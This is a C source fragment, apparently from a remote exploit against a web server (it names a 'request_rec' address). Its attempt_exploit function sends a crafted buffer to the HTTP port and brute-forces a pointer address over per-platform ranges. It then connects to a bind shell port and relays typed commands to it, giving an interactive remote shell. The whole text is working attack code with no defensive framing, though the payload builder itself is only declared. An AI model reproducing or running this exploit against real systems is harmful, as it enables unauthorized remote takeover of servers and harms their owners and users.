
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;




typedef struct TYPE_2__ TYPE_1__ ;


typedef int fd_set ;
struct TYPE_2__ {char* platform; scalar_t__ bruteStart; scalar_t__ bruteEnd; int retAddr; } ;


 int BRUTE_FORCE_EXHAUSTED ;
 scalar_t__ FD_ISSET (int,int *) ;
 int FD_SET (int,int *) ;
 int FD_ZERO (int *) ;
 int HTTP_PORT ;
 scalar_t__ MAGIC_R_END ;
 scalar_t__ MAGIC_R_START ;
 int SHELL_PORT ;
 scalar_t__ SIZ ;
 int SUCCESS ;
 char* buf ;
 int close (int) ;
 int connect_to_host (int ) ;
 int exactPointerAddy ;
 int fflush (int ) ;
 char* host ;
 scalar_t__ magic_r ;
 int make_exploitbuf (char*) ;
 int my_recv (int) ;
 int my_send (int,char*) ;
 int my_sleep (int) ;
 int printf (char*,...) ;
 int read (int ,char*,scalar_t__) ;
 int recv (int,char*,scalar_t__,int ) ;
 int retAddr ;
 int select (int,int *,int *,int *,int *) ;
 int send (int,char*,int ,int ) ;
 int stdout ;
 int strlen (char*) ;
 TYPE_1__* targets ;
 size_t useTarget ;

int attempt_exploit(void) {
 fd_set rfds;
 int sock,retVal,r;

 if(exactPointerAddy) {
  printf("[-] Using 0x%08x for pointer addy\n", exactPointerAddy);
  if((sock=connect_to_host(HTTP_PORT))<=0)
   return sock;
  magic_r=exactPointerAddy;
  make_exploitbuf(buf);
  my_send(sock, buf);
  my_recv(sock);
  close(sock);
  my_sleep(100000);
                if((sock=connect_to_host(SHELL_PORT))<=0) {
   return sock;
  }
 } else {
  printf("[-] Attempting attack [ %s ] ...\n", targets[useTarget].platform);
  MAGIC_R_START=targets[useTarget].bruteStart;
  MAGIC_R_END=targets[useTarget].bruteEnd;
  retAddr=targets[useTarget].retAddr;
  for(magic_r=MAGIC_R_START; magic_r<=MAGIC_R_END; magic_r++) {
   printf("[-] Trying 0x%08x ... \r", magic_r);fflush(stdout);
   if((sock=connect_to_host(HTTP_PORT))<=0)
    return sock;
   make_exploitbuf(buf);
   my_send(sock, buf);
   my_recv(sock);
   close(sock);
   my_sleep(50000);
   if((sock=connect_to_host(SHELL_PORT))>=SUCCESS) {
    printf("\n[-] Found request_rec address @ 0x%08x\n", magic_r);
    break;
   }
  }
  if(magic_r>MAGIC_R_END)
   return BRUTE_FORCE_EXHAUSTED;
 }

        printf("[-] Connected to %s! You can type commands now:\n", host);



        do {
                FD_ZERO(&rfds);
                FD_SET(0, &rfds);
                FD_SET(sock, &rfds);
                retVal=select(sock+1, &rfds, ((void*)0), ((void*)0), ((void*)0));
                if(retVal) {
                        if(FD_ISSET(sock, &rfds)) {
                                buf[(r=recv(sock, buf, SIZ-1,0))]='\0';
                                printf("%s", buf);
                        }
                        if(FD_ISSET(0, &rfds)) {
                                buf[(r=read(0, buf, SIZ-1))]='\0';
                                send(sock, buf, strlen(buf), 0);
                        }

                }
        } while(retVal && r);

        close(sock);
        return SUCCESS;
}
